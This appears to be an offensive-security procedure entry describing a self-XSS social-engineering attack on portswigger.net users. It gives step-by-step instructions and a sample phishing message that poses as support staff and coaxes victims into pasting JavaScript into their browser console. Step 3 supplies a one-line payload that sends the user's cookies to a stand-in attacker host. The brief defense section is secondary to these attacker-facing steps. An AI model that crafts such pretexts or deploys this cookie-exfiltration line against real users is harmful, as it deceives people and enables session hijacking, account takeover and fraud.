---
id: proc-uuid2-placeholder
tags:
  - social-engineering
  - self-xss
  - xss
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[Phishing]]'
updated_at: '2025-12-14T03:16:02.724Z'
skill_level: beginner
impact_level: low
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Phishing]]'
---
# Trick-User-into-Executing-Self-XSS-JS

## Summary

This procedure outlines a social engineering technique to deceive users into executing malicious JavaScript in their browser console on vulnerable sites like PortSwigger's, exploiting the lack of self-XSS protections to achieve account compromise, fraud, or spam propagation.

## Description

Attackers craft convincing messages (e.g., via email or chat) pretending to be support staff, urging users to "troubleshoot" by opening the console on https://portswigger.net/ and pasting JS code. Without protections, the code runs, potentially exfiltrating cookies or performing other actions. This targets low-knowledge users and is low-severity, as it relies on user error rather than direct exploitation. Prerequisites: Communication channel to the victim and a malicious JS payload. Outcomes include session hijacking or data theft.

## Requirements

1. Communication method (email, chat) to contact the target user
2. Malicious JS payload (e.g., cookie stealer)
3. Target user visiting the vulnerable site

## Defense

Defensive measures and detection strategies:

- Deploy client-side protections like console JS alerts
- User training on recognizing social engineering
- Monitor for unexpected data exfiltration from browsers

## Objectives

1. Induce user to self-inject JS
2. Achieve session compromise or fraud
3. Propagate attack via spam if applicable

## Instructions

### Step 1: Craft Phishing Message

**Context**: Create a believable pretext to lure the user into action.

Compose a message like: "Hi, to fix your account issue on PortSwigger, open https://portswigger.net/, press F12, go to Console, and paste this code: [malicious JS]. Press Enter."

> Expected output: User receives and engages with the message.

### Step 2: Direct User to Site and Console

**Context**: Guide the user to the vulnerable environment.

Instruct the user to visit the site and open the developer console as specified.

> Expected output: User confirms they've opened the console.

### Step 3: Instruct JS Execution

**Context**: Have the user run the payload to trigger the attack.

Provide the JS, e.g., `document.location='https://attacker.com/?data='+btoa(document.cookie);`, and tell them to paste and execute it.

> Expected output: JS runs unimpeded, sending data to attacker; no site blocks occur.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[JavaScript]]
- [[Phishing]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[social-engineering]]
- [[self-xss]]
- [[xss]]
